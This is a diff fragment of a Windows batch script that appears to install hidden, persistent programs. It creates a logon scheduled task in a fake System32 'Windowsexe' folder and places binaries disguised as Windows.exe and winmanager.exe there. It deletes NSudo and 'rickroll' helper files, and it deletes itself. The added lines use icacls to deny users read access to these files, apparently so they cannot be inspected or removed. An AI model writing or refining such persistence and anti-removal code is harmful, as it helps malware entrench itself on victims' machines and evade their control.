@@ -48,12 +48,25 @@ SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Update.bat
 del /f rickroll.*
 del /f NSudo.exe
 powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
+timeout /t 5 /nobreak
 icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 icacls  "%systemroot%\System32\Windowsexe\Windows2.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 icacls  "%systemroot%\System32\Windowsexe\Windows3.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 icacls  "%systemroot%\System32\Windowsexe\Update.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 icacls  "%systemroot%\System32\Windowsexe\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 icacls  "%systemroot%\System32\Windows Manager\winmanager.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls "%systemroot%\System32\Windowsexe\AV.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%systemroot%\System32\Windowsexe\Update.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%systemroot%\System32\Windowsexe\Windows.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%systemroot%\System32\Windowsexe\Windows3.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%systemroot%\System32\Windows Manager\winmanager.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%systemroot%\System32\Windowsexe\AV.bat" /deny everyone:R "%username%":R
+icacls "%systemroot%\System32\Windowsexe\Update.bat" /deny everyone:R "%username%":R
+icacls "%systemroot%\System32\Windowsexe\Windows.exe" /deny everyone:R "%username%":R
+icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /deny everyone:R "%username%":R
+icacls "%systemroot%\System32\Windowsexe\Windows3.exe" /deny everyone:R "%username%":R
+icacls "%systemroot%\System32\Windows Manager\winmanager.exe" /deny everyone:R "%username%":R
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
